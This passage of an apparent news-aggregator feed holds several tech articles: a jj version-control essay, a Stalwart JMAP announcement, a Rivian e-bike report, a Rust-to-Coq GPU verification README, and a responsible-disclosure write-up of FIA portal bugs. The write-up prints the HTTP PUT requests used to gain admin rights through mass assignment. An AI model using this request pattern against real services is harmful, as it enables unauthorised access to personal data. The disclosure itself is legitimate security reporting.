    &lt;p&gt;Market fit: there was basically no credible alternatives to C and C++. I had been involved in the D community a bit, but it was clear that it wasn’t going to take off. Go was a few years old, and hit 1.0 earlier that year, but for the kinds of work that C and C++ are uniquely able to do, I saw the same problem that I did with D: garbage collection. This doesn’t mean Go isn’t a good language, or that it’s not popular, but I didn’t see it as being able to credibly challenge C and C++ in their strongholds. Rust, on the other hand, had a novel approach to these problems: memory safety without garbage collection. Now, I also need to mention that Rust back in those days was much closer to Go than it even is today, but again, I had just learned about it for a few hours, I didn’t really have a deep understanding of it yet. If I had, I actually might have also dismissed it as well, as it wasn’t really GC that was the issue, but a significant runtime. But again: I hadn’t really come to that understanding yet. Point is: low-level programming was a space where there hadn’t been much innovation in a very long time, and I thought that meant that Rust had a chance. Check.&lt;/p&gt;
    &lt;p&gt;For a team: well, Mozilla was backing it. This is a big deal. It meant that there were folks whose job it was to work on the language. There’s so much that you need to do to make a new language, and that means a ton of work, which means that if you’re going to be able to get it done in a reasonable amount of time, having paid folks working on it is certainly better than the alternative. Check.&lt;/p&gt;
    &lt;p&gt;And finally, how does this translate into users? Well, Mozilla was planning on using it in Firefox. This is huge. Firefox is a major project, and if they could manage to use Rust in it, that would prove that Rust was capable of doing real work. And, more importantly, it would mean that there would be a lot of folks who would need to learn Rust to work on Firefox. This would create a base of users, which would help the language grow. Check.&lt;/p&gt;
    &lt;p&gt;Finally, even though it wasn’t part of my initial assessment, I just really liked the Rust folks. I had joined IRC and chatted with people, and unlike many IRC rooms, they were actually really nice. I wanted to be around them more. And if I did, other people probably would too. So that was also a plus.&lt;/p&gt;
    &lt;p&gt;So, I started learning Rust. I decided to write a tutorial for it, “Rust for Rubyists,” because I’m a sucker for alliteration. And I eventually joined the team, co-authored The Book, and if you’re reading this post, you probably know the rest of the story.&lt;/p&gt;
    &lt;head rend="h2"&gt;Enter jj&lt;/head&gt;
    &lt;p&gt;For some background, jj is a new version control system (VCS), not a programming language. It is written in Rust though! While I talked about how I decided to get involved with Rust above, my approach here generalizes to other kinds of software projects, not just programming languages.&lt;/p&gt;
    &lt;p&gt;I have a rule of thumb: if Rain likes something, I will probably like that thing, as we have similar technical tastes. So when I heard her talk about jj, I put that on my list of things to spend some time with at some point. I was especially intrigued because Rain had worked at Meta on their source control team. So if she’s recommending something related to source control, that’s a huge green flag.&lt;/p&gt;
    &lt;p&gt;It took me a while, but one Saturday morning, I woke up a bit early, and thought to myself, “I have nothing to do today. Let’s take a look at jj.” So I did. You’ll note that link goes to a commit starting a book about jj. Since it worked for me with Rust, it probably would work for me for jj as well. Writing about something really helps clarify my thinking about it, and what better time to write something for a beginner than when you’re also a beginner?&lt;/p&gt;
    &lt;p&gt;Anyway, people seem to really like my tutorial, and I’m thankful for that.&lt;/p&gt;
    &lt;head rend="h2"&gt;The future of jj&lt;/head&gt;
    &lt;p&gt;So, what do I see in jj? Well, a lot of it kind of eerily mirrors what I saw in Rust: a good market fit, a solid team, and a potential user base.&lt;/p&gt;
    &lt;p&gt;But the market fit is interesting. Git has clearly won, it has all of the mindshare, but since you can use jj to work on Git repositories, it can be adopted incrementally. At Oxide, Rain started using jj, and more of us did, and now we’ve got a chat channel dedicated to it. This is, in my opinion, the only viable way to introduce a new VCS: it has to be able to be partially adopted.&lt;/p&gt;
    &lt;p&gt;Google is using jj, and so that is a bit different than Mozilla, but the same basic idea. I have more to say about Google’s relationship to jj, but that’s going to be a follow-up blog post. What I will say in this post is that at the first ever jj conference a few weeks ago, Martin (the creator of jj) said that internal adoption is going really well. I’m burying the lede a bit here, because the video isn’t up yet, and I don’t want to get the details of some of the more exciting news incorrect in this post. I also don’t mean to imply that everyone at Google is using jj, but the contingent feels significant to me, given how hard it is to introduce a new VCS inside a company of that size. Well, in this case, it’s using Piper as the backend, so you could argue about some of the details here, but the point is: jj is being used in projects as small as individual developers and as large as one of the largest monorepos in the world. That’s a big deal. It can show the social proof needed for others to give jj a chance.&lt;/p&gt;
    &lt;p&gt;Outside of Google, a lot of people say that there’s a bit of a learning curve, but once you get over that, people really like it. Sound familiar? I think jj is different from Rust in this regard in that it’s also very easy to learn if you aren’t someone who really knows a ton about Git. It’s folks that really know Git internals and have put time and care into their workflows that can struggle a bit with jj, because jj is different. But for people who just want to get work done, jj is really easy to pick up. And when people do, they often tend to like it. jj has developed a bit of a reputation for having a passionate fanbase. People are adopting it in a skunkworks way. This is a great sign for a new tool.&lt;/p&gt;
    &lt;p&gt;And finally, the team. Martin is very dedicated to jj, and has been working on it for a long time. There’s also a small group of folks working on it with him. It recently moved out from his personal GitHub account to its own organization, and has started a more formal governance. The team is full of people who have a deep history of working on source control tools, and they know what they’re doing. The burgeoning jj community reminds me of that early Rust community: a bunch of nice folks who are excited about something and eager to help it grow.&lt;/p&gt;
    &lt;p&gt;Basically, to me, jj’s future looks very bright. It reminds me of Rust in all of the best ways.&lt;/p&gt;
    &lt;head rend="h2"&gt;Putting my money where my mouth is&lt;/head&gt;
    &lt;p&gt;Speaking of burying the lede… I’ve decided to leave Oxide. Oxide is the best job I’ve ever had, and I love the people I work with. I was employee 17. I think the business will do fantastic in the future, and honestly it’s a bit of a strange time to decide to leave, since things are going so well. But at the same time, some of my friends have started a new company, ERSC, which is going to be building a new platform for developer collaboration on top of jj. Don’t worry, “errssk” isn’t going to be the name of the product. It’s kind of like how GitHub was incorporated as Logical Awesome, but nobody calls it that.&lt;/p&gt;
    &lt;p&gt;This won’t be happening until next month, I have some stuff to wrap up at Oxide, and I’m going to take a week off before starting. But as sad as I am to be leaving Oxide, I’m also really excited to be able to spend more time working in the jj community, and helping build out this new platform. For those of you who’ve been asking me to finish my tutorial, well, now I’ll have the time to actually do that! I’m sorry it’s taken so long! You’ll see me talking about jj even more, spending even more time in the Discord, and generally being more involved in the community. And I’ll be writing more posts about it here as well, of course.&lt;/p&gt;
    &lt;p&gt;I’m really excited about this next chapter. 2025 has been a very good year for me so far, for a number of reasons, and I am grateful to be able to take a chance on something that I’m truly passionate about.&lt;/p&gt;
    &lt;p&gt;Here’s my post about this post on BlueSky:&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://steveklabnik.com/writing/i-see-a-future-in-jj/"/><published>2025-10-22T17:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672336</id><title>JMAP for Calendars, Contacts and Files Now in Stalwart</title><updated>2025-10-23T04:12:24.082386+00:00</updated><content>&lt;doc fingerprint="7f97c6ce69b80dc3"&gt;
  &lt;main&gt;
    &lt;p&gt;After four years of development, we’re thrilled to announce a major milestone in the evolution of Stalwart — the full implementation of JMAP for Calendars, Contacts, Address Books, File Storage, and Sharing. With this release, Stalwart becomes the first JMAP server to fully support the entire family of JMAP collaboration protocols, marking a new era for open, efficient, and elegant groupware.&lt;/p&gt;
    &lt;head rend="h2"&gt;A New Generation of Protocols&lt;/head&gt;
    &lt;p&gt;Over the past few years, the IETF has been redefining how email, calendars, and contacts are synchronized and shared. Building upon the success of JMAP for Mail, several new protocol extensions have been introduced:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;JMAP for Calendars - A modern replacement for CalDAV and CalDAV Scheduling.&lt;/item&gt;
      &lt;item&gt;JMAP for Contacts – A powerful alternative to CardDAV.&lt;/item&gt;
      &lt;item&gt;JMAP for File Storage – A replacement for WebDAV-based file storage.&lt;/item&gt;
      &lt;item&gt;JMAP Sharing – A modern successor to WebDAV ACL.&lt;/item&gt;
      &lt;item&gt;JSCalendar - A clean, JSON-based evolution of iCalendar.&lt;/item&gt;
      &lt;item&gt;JSContact – A modernized, JSON-native successor to vCard.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Together, these standards offer a cohesive and elegant ecosystem that replaces decades of fragmented WebDAV-based technologies.&lt;/p&gt;
    &lt;head rend="h2"&gt;Limitations of Yesterday's Technology&lt;/head&gt;
    &lt;p&gt;WebDAV and its descendants — CalDAV, CardDAV, and related extensions — have served the Internet well. They are robust, widely adopted, and battle-tested. Yet, their XML-based design is notoriously verbose, inconsistent, and difficult to implement correctly. Information is scattered across HTTP headers, XML payloads, and even embedded iCalendar data, creating endless compatibility and interoperability challenges between clients and servers.&lt;/p&gt;
    &lt;p&gt;Similarly, iCalendar and vCard, while expressive and versatile, have accumulated decades of technical debt. They contain countless properties and parameters—many rarely used, some obsolete, and others inconsistently implemented across versions. This clutter has made both formats unwieldy and error-prone, often requiring complex parsing logic to handle edge cases.&lt;/p&gt;
    &lt;head rend="h2"&gt;JMAP: A Modern Solution for Modern Needs&lt;/head&gt;
    &lt;p&gt;The JMAP protocol was originally developed as a more efficient, modern replacement for IMAP and SMTP submissions. Its strengths lie in simplicity, clarity, and network efficiency — all built on top of JSON over HTTPS.&lt;/p&gt;
    &lt;p&gt;Now, with the introduction of JMAP for Calendars, Contacts, Files, and Sharing, the same design philosophy extends beyond email to the entire collaboration stack. These protocols deliver what DAV always aimed for but never quite achieved: a clean, uniform, and easily implementable API for all personal and group data — mail, calendars, contacts, files, and shared resources.&lt;/p&gt;
    &lt;p&gt;Meanwhile, JSCalendar and JSContact reimagine iCalendar and vCard as elegant JSON-based formats. They strip away decades of accumulated cruft, unify representations, and offer a clear, unambiguous, and expressive data model. Both are human-readable, developer-friendly, and efficient to parse — a perfect fit for modern applications.&lt;/p&gt;
    &lt;p&gt;Together, JMAP and these new data models make calendaring, contact management, and file sharing not only easier to implement but also faster and more reliable.&lt;/p&gt;
    &lt;head rend="h2"&gt;Why This Matters&lt;/head&gt;
    &lt;p&gt;This release represents more than new features — it marks a shift in how groupware protocols are designed and implemented. For the first time, developers and organizations can build on a single, coherent, JSON-based framework for mail, contacts, calendars, and shared resources.&lt;/p&gt;
    &lt;p&gt;We believe this will revolutionize calendaring and collaboration. Implementations will become easier, interoperability issues will decrease, and innovation will accelerate. The simplicity and predictability of JMAP empower both clients and servers to focus on features and user experience, not protocol gymnastics.&lt;/p&gt;
    &lt;head rend="h2"&gt;Client Support and Ecosystem&lt;/head&gt;
    &lt;p&gt;As Stalwart is the first complete JMAP server to support these new protocols, client support is still emerging. However, we’re excited to share that several projects are already working to adopt these new standards. Mailtemi, Parula, and OpenCloud are actively developing client-side implementations for JMAP Calendars, Contacts, and File Storage. The ecosystem is growing, and we expect rapid adoption as developers experience the elegance and power of JMAP firsthand.&lt;/p&gt;
    &lt;head rend="h2"&gt;A Word of Thanks&lt;/head&gt;
    &lt;p&gt;We would like to express our sincere gratitude to NLNet for supporting the development of these features through the NGI Zero grant program. Their commitment to open standards and privacy-respecting technology continues to make projects like Stalwart possible.&lt;/p&gt;
    &lt;head rend="h2"&gt;Looking Ahead to 1.0.0&lt;/head&gt;
    &lt;p&gt;After four years of dedicated development, we’re proud to announce that Stalwart is now feature complete. With this milestone, all the core capabilities of a modern mail and collaboration server are fully implemented.&lt;/p&gt;
    &lt;p&gt;That said, our work is far from over. We are now focusing on finalizing the database schema, improving performance, and addressing the hundreds of enhancement requests on GitHub. Our goal is to deliver a stable &lt;code&gt;1.0.0&lt;/code&gt; release within the next few months — one that sets a new standard for open, efficient, and modern communication servers.&lt;/p&gt;
    &lt;p&gt;Stalwart is now the most complete, elegant, and forward-looking JMAP collaboration platform available.&lt;/p&gt;
    &lt;p&gt;And this is only the beginning.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://stalw.art/blog/jmap-collaboration/"/><published>2025-10-22T17:26:06+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45672844</id><title>Rivian's TM-B electric bike</title><updated>2025-10-23T04:12:23.848129+00:00</updated><content>&lt;doc fingerprint="2229555b01359b31"&gt;
  &lt;main&gt;
    &lt;p&gt;Rivian’s micromobility spinoff Also has just taken the wraps off its TM-B e-bike, TM-Q pedal-assisted electric quad bike, and Alpha Wave helmet that represents “a breakthrough in rider safety and connectivity.”&lt;/p&gt;
    &lt;head rend="h1"&gt;Rivian’s first e-bike is unlike anything you’ve ever seen&lt;/head&gt;
    &lt;p&gt;The TM-B electric bike is launching alongside the TM-Q pedal-assisted quad and Alpha Wave helmet.&lt;/p&gt;
    &lt;p&gt;The TM-B electric bike is launching alongside the TM-Q pedal-assisted quad and Alpha Wave helmet.&lt;/p&gt;
    &lt;p&gt;The TM-B (aka Transcendent Mobility - Bike) with its 24 x 2.6-inch wheels and integrated front- and rear-lighting looks and functions like nothing else on the market. It features a new pedal-by-wire drivetrain called “DreamRide” developed in-house. The rider pedals a generator, which replenishes the battery, while a separate software-driven traction motor drives the rear wheel via a Gates Carbon belt.&lt;/p&gt;
    &lt;p&gt;The removable battery — available in either 538Wh or 808Wh packs, offering up 100 miles of range — features two USB-C ports. The batteries can be charged over USB-C at 240W, going from zero to full in two hours and 20 minutes or three hours and 45 minutes, respectively. They can also act as a portable power bank for your gadgets. An E Ink display shows the battery’s current charge.&lt;/p&gt;
    &lt;p&gt;As a Class 3 e-bike, it has a pedal-assisted top speed of 28mph (45kph). It also features a throttle good for 20mph where regulations allow, and an astounding 180Nm of torque on tap — enough to flatten steep hills and make quick starts off the line when carrying heavy loads. Hydraulic disc brakes help bring everything to a controlled stop, while regenerative braking could extend range by an estimated 25 percent.&lt;/p&gt;
    &lt;p&gt;The top frame of the TM-B is modular by design, so the bike can be transformed without tools into a cargo hauler, kid carrier, or cruiser with a bench seat. The seat post is unlocked via a quick swipe from the 5-inch circular touchscreen console. An inverted front fork suspension and air shock will help soak up bumps for riders ranging from 4 feet 11 inches to 6 feet 8 inches.&lt;/p&gt;
    &lt;p&gt;There’s also plenty of security baked in that automatically activates and deactivates when the rider is nearby. It locks the battery, back wheel, and frame, with tamper alerts and bike location provided in real time.&lt;/p&gt;
    &lt;p&gt;A $4,500 launch edition TM-B can be preordered now with delivery slated for spring 2026. A $4,000 base edition is scheduled for sometime later in 2026.&lt;/p&gt;
    &lt;p&gt;Also also unveiled its Alpha Wave helmet. “It incorporates Release Layer System (RLS), a technology that offers a step-change in rotational impact protection,” says Also, which certainly sounds impressive. It also features integrated lights and a four-speaker, wind-shielded internal audio system with two noise-canceling mics. The helmet integrates with the TM-B’s console, where music, calls, and podcasts can be controlled on the bike.&lt;/p&gt;
    &lt;p&gt;Lastly, Also’s TM-Q is the TM-B extended to a pedal-assisted electric four-wheeler to carry heavier loads. Also says it’ll be “bike lane compliant,” so it can be used for last-mile deliveries in congested cities. It’ll be sold in both commercial and consumer variants, the latter for ridding around gated communities.&lt;/p&gt;
    &lt;p&gt;The TM-B aesthetic is certainly divisive — I love it, but I was a big fan of Cake’s utilitarian designs before bankruptcy. It’s a lot to take in and certainly needs thorough testing to draw any final conclusion. But it’s good to see a fresh, deep-pocketed face breathing new life into e-bikes when entrenched players and boutique brands are struggling to stay afloat.&lt;/p&gt;
    &lt;p&gt;“Our vision is to bring together the latest technology with fun, thoughtful design to create small EVs that inspire people to adopt these more efficient modes,” said Chris Yu, president of Also. “This launch has been years in the making and it is just the beginning of a broader platform we are building that we believe will catalyze adoption globally.”&lt;/p&gt;
    &lt;head rend="h2"&gt;Most Popular&lt;/head&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;GM will ditch Apple CarPlay and Android Auto on all its cars, not just EVs&lt;/item&gt;
      &lt;item&gt;Even Xbox developer kits are getting a big price hike&lt;/item&gt;
      &lt;item&gt;Rivian’s first e-bike is unlike anything you’ve ever seen&lt;/item&gt;
      &lt;item&gt;Meta is axing 600 roles across its AI division&lt;/item&gt;
      &lt;item&gt;Samsung Galaxy XR hands-on: It’s like a cheaper Apple Vision Pro and launches today&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://www.theverge.com/news/804157/rivian-tm-b-electric-bike-price-specs-helmet-quad"/><published>2025-10-22T18:00:20+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45673130</id><title>Accessing Max Verstappen's passport and PII through FIA bugs</title><updated>2025-10-23T04:12:23.593704+00:00</updated><content>&lt;doc fingerprint="6c1f451b1fc79758"&gt;
  &lt;main&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;With security startups getting flooded with VC funding in the past few years, some of the biggest networking events have centered themselves around the Formula 1 Grand Prix. Companies like CrowdStrike and Darktrace spend millions of dollars sponsoring teams, while others like Bitdefender have official partnerships to be a racing team's cybersecurity partner.&lt;/p&gt;
    &lt;p&gt;Having been able to attend these events by hoarding airline miles and schmoozing certain cybersecurity vendors, Gal Nagli, Sam Curry, and I thought it would be fun to try and hack some of the different supporting websites for the Formula 1 events.&lt;/p&gt;
    &lt;p&gt;This blog is part 1 of 3 in a series of vulnerabilities found in Formula 1.&lt;/p&gt;
    &lt;head rend="h2"&gt;Finding F1 Driver Licenses&lt;/head&gt;
    &lt;p&gt;To race in Formula 1, drivers hold an FIA Super Licence. It’s issued annually through a driver’s national motorsport authority (ASN) once they’ve met the FIA’s requirements, typically spending years in smaller races to earn Super Licence points, along with meeting minimum age thresholds and other medical/written tests.&lt;/p&gt;
    &lt;p&gt;F1 drivers often compete outside Grands Prix as well, where the FIA uses a Driver Categorisation (Bronze/Silver/Gold/Platinum) to balance teams. That categorisation is managed via the FIA portal at drivercategorisation.fia.com, which supports public self-registration for competitors to request or update their Bronze/Silver/Gold/Platinum status and submit results for review. This system is separate from the Super Licence, but many F1 drivers appear in both and receive automatic Platinum status for holding an active Super Licence.&lt;/p&gt;
    &lt;p&gt;After creating an account with an email and password, you are thrown into the actual application process. Normally, you will have to upload a lot of supporting documents for your request for categorization, including identity documents and racing CVs/history. However, we noticed there is a very simple HTTP PUT request that is used to update your user profile:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null
}&lt;/code&gt;
    &lt;p&gt;The HTTP request to update our profile didn't really have many interesting attributes, but the JSON returned in the response had a lot of extra values:&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "2000-02-17",
  "gender": null,
  "token": null,
  "roles": null,
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}&lt;/code&gt;
    &lt;p&gt;The JSON HTTP response for updating our own profile contained the "roles" parameter, something that might allow us to escalate privileges if the PUT request was vulnerable to mass assignment. We began looking through the JavaScript for any logic related to this parameter.&lt;/p&gt;
    &lt;p&gt;Based on the JavaScript, there were a number of different roles on the website that were intended to be used by drivers, FIA staff, and site administrators. The most interesting one was obviously admin, so we guessed the correct HTTP PUT request format to try and update our roles based on the JavaScript:&lt;/p&gt;
    &lt;code&gt;PUT /api/users/12934 HTTP/1.1
Host: driverscategorisation.fia.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Content-Length: 246
Content-Type: application/json

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ]
}&lt;/code&gt;
    &lt;p&gt;Our test worked exactly as predicted. The HTTP response showed that the update was successful, and we now held the administrator role for the website.&lt;/p&gt;
    &lt;code&gt;HTTP/1.1 200
Content-type: application/json
Content-Length: 313

{
  "id": 12934,
  "email": "samwcurry@gmail.com",
  "firstName": "Sam",
  "lastName": "Curry",
  "nickName": null,
  "keepNamePrivate": false,
  "nickName2": null,
  "birthDate": "1999-10-17",
  "gender": null,
  "token": null,
  "roles": [
    {
      "id": 1,
      "description": "ADMIN role",
      "name": "ADMIN"
    }
  ],
  "country": null,
  "filters": [],
  "status": "ACTIVATED",
  "secondaryEmail": null
}
&lt;/code&gt;
    &lt;p&gt;We reauthenticated in order to refresh our session, and upon logging in, we were shown an entirely new dashboard that was intended to be used by FIA administrators to categorise drivers, manage employees, and update server-side variables like email templates and more. We seemed to have full admin access to the FIA driver categorization website.&lt;/p&gt;
    &lt;p&gt;To validate our finding, we attempted to load a driver's profile and observed the user's password hash, email address, phone number, passport, resume, and all related PII. Additionally, we could load all internal communications related to driver categorisation including comments about their performance and committee related decisions.&lt;/p&gt;
    &lt;p&gt;We stopped testing after seeing that it was possible to access Max Verstappen's passport, resume, license, password hash, and PII. This data could be accessed for all F1 drivers with a categorization, alongside sensitive information of internal FIA operations. We did not access any passports / sensitive information and all data has been deleted.&lt;/p&gt;
    &lt;head rend="h3"&gt;Disclosure timeline&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;06/03/2025: Initial disclosure to FIA via email and Linkedin&lt;/item&gt;
      &lt;item&gt;06/03/2025: Initial response from FIA, site taken offline&lt;/item&gt;
      &lt;item&gt;06/10/2025: Official response from FIA informing us of a comprehensive fix&lt;/item&gt;
      &lt;item&gt;10/22/2025: Release of blog post, public disclosure&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://ian.sh/fia"/><published>2025-10-22T18:21:54+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45673479</id><title>Criticisms of “The Body Keeps the Score”</title><updated>2025-10-23T04:12:23.434485+00:00</updated><content/><link href="https://josepheverettwil.substack.com/p/the-body-keeps-the-score-is-bullshit"/><published>2025-10-22T18:49:04+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45674126</id><title>Show HN: Cuq – Formal Verification of Rust GPU Kernels</title><updated>2025-10-23T04:12:22.793440+00:00</updated><content>&lt;doc fingerprint="1dbe9b9a44aab9d0"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;Cuq: A MIR-to-Coq Framework Targeting PTX for Formal Semantics and Verified Translation of Rust GPU Kernels&lt;/head&gt;
    &lt;p&gt;Rust's rise as a systems language has extended into GPU programming through projects like Rust-CUDA and rust-gpu, which compile Rust kernels to NVIDIA's PTX or SPIR-V backends. Yet despite Rust's strong safety guarantees, there is currently no formal semantics for Rust's GPU subset, nor any verified mapping from Rust's compiler IR to PTX's formally defined execution model.&lt;/p&gt;
    &lt;p&gt;This project introduces the first framework for formally verifying the semantics of Rust GPU kernels by translating Rust's Mid-level Intermediate Representation (MIR) into Coq and connecting it to the existing Coq formalization of the PTX memory model (Lustig et al., ASPLOS 2019). Rather than modeling Rust's ownership and borrowing rules directly, this work focuses on defining a mechanized operational semantics for a realistic subset of MIR and establishing memory-model soundness: proving that MIR atomic and synchronization operations compile soundly to PTX instructions under the PTX memory model.&lt;/p&gt;
    &lt;p&gt;Cuq = CUDA + Coq.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;No formal semantics for Rust GPU code: Although Rust compilers can emit GPU code via NVVM or SPIR-V, the semantics of such kernels are defined only informally through the compiler's behavior. There is no mechanized model of MIR execution for GPU targets.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Disconnect between high-level Rust and verified GPU models: NVIDIA's PTX memory model has a complete Coq specification, but that model has never been linked to a high-level language. Existing proofs connect only C++ atomics to PTX atomics.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;MIR as a verification sweet spot: MIR is a well-typed SSA IR that preserves Rust's structured control flow and side-effect information while stripping away syntax. It provides a precise, implementation-independent level at which to define semantics and translate to Coq.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Define a mechanized semantics for MIR: Implement a Coq formalization of a simplified MIR subset sufficient to express GPU kernels: variable assignment, arithmetic, control flow, memory loads/stores, and synchronization intrinsics.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;Translate MIR to Coq: Develop a translation tool that consumes&lt;/p&gt;&lt;code&gt;rustc&lt;/code&gt;'s&lt;code&gt;-Z dump-mir&lt;/code&gt;output and produces corresponding Gallina definitions. The translation captures MIR basic blocks, terminators, and memory actions as Coq terms.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Connect to PTX semantics: Use the existing Coq formalization of PTX to define a memory-model correspondence between MIR and PTX traces. The initial goal is to prove soundness in the same sense as Lustig et al. (ASPLOS 2019):&lt;/p&gt;
        &lt;p&gt;If a MIR kernel is data-race-free under the MIR memory model, its compiled PTX program admits only executions consistent with the PTX memory model.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Property verification: Leverage this semantics to verify kernel-level properties such as:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Absence of divergent barrier synchronization;&lt;/item&gt;
          &lt;item&gt;Preservation of sequential equivalence (e.g., for reductions or scans);&lt;/item&gt;
          &lt;item&gt;Conformance to the PTX consistency model under shared-memory interactions.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Prototype toolchain: Deliver a prototype that automatically translates Rust-CUDA kernels into Coq terms, evaluates their semantics within Coq, and interfaces with PTX proofs.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A Coq formalization of Rust MIR semantics for GPU kernels using Rust nightly-2025-03-02.&lt;/item&gt;
      &lt;item&gt;A MIR→PTX memory-model correspondence theorem, establishing soundness of atomic and synchronization operations for a well-defined kernel subset.&lt;/item&gt;
      &lt;item&gt;A prototype translator generating Coq verification artifacts from Rust code.&lt;/item&gt;
      &lt;item&gt;Case studies on standard CUDA benchmarks (e.g., SAXPY, reductions) verifying barrier correctness and dataflow soundness.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;While this first phase omits Rust's ownership and lifetime reasoning, the framework is designed to incorporate it later. Future extensions can integrate ownership types or affine resource logics into the MIR semantics, enabling end-to-end proofs of data-race freedom and alias safety.&lt;/p&gt;
    &lt;p&gt;This project establishes the missing formal bridge between Rust's compiler infrastructure and the only existing mechanized model of GPU execution. By defining verified semantics for MIR and connecting it to PTX, it provides the foundation for future CompCert-style verified compilation of GPU code and opens the door to ownership-aware proofs of safety and correctness for massively parallel Rust programs.&lt;/p&gt;
    &lt;p&gt;Rebuild the MIR dumps, translate them into Coq, and check the traces/bridges with:&lt;/p&gt;
    &lt;code&gt;make demo
&lt;/code&gt;
    &lt;p&gt;The target performs three steps:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;rustc -Z dump-mir=all&lt;/code&gt;for&lt;code&gt;examples/saxpy.rs&lt;/code&gt;and&lt;code&gt;examples/atomic_flag.rs&lt;/code&gt;(writes into&lt;code&gt;mir_dump/&lt;/code&gt;).&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;tools/mir2coq.py&lt;/code&gt;parses the&lt;code&gt;PreCodegen.after&lt;/code&gt;dumps and regenerates&lt;code&gt;coq/examples/{saxpy,atomic_flag}_gen.v&lt;/code&gt;.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;make -C coq all&lt;/code&gt;type-checks the MIR semantics, the generated programs, and the MIR→PTX translation lemmas.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Afterwards you can inspect &lt;code&gt;coq/examples/*_gen.v&lt;/code&gt; and re-run &lt;code&gt;Eval compute&lt;/code&gt; queries found in &lt;code&gt;coq/MIRTests.v&lt;/code&gt; to see the MIR event traces and their PTX images.&lt;/p&gt;
    &lt;code&gt;examples/*.rs --rustc -Z dump-mir--&amp;gt; mir_dump/*.mir --tools/mir2coq.py--&amp;gt; coq/examples/*_gen.v
        \                                                                 |
         \--&amp;gt; target/*.ptx (optional)                                     v
           Coq build (MIRSyntax + MIRSemantics + Translate + Soundness) -&amp;gt; PTX event traces
&lt;/code&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Ensure the Rust nightly and Coq toolchain are available:&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;
            &lt;code&gt;rustup toolchain install nightly-2025-03-02&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;
            &lt;code&gt;rustup override set nightly-2025-03-02&lt;/code&gt;
          &lt;/item&gt;
          &lt;item&gt;&lt;code&gt;opam install coq&lt;/code&gt;(Coq ≥ 8.18)&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;&lt;p&gt;In every new shell, activate the Coq switch so&lt;/p&gt;&lt;code&gt;coq_makefile&lt;/code&gt;is on your&lt;code&gt;PATH&lt;/code&gt;:&lt;code&gt;eval "$(opam env)"&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Run the end-to-end build:&lt;/p&gt;
        &lt;code&gt;make demo make bad-demo&lt;/code&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Refer to &lt;code&gt;docs/mapping-table.md&lt;/code&gt; for the full table. In short:&lt;/p&gt;
    &lt;list rend="ul"&gt;
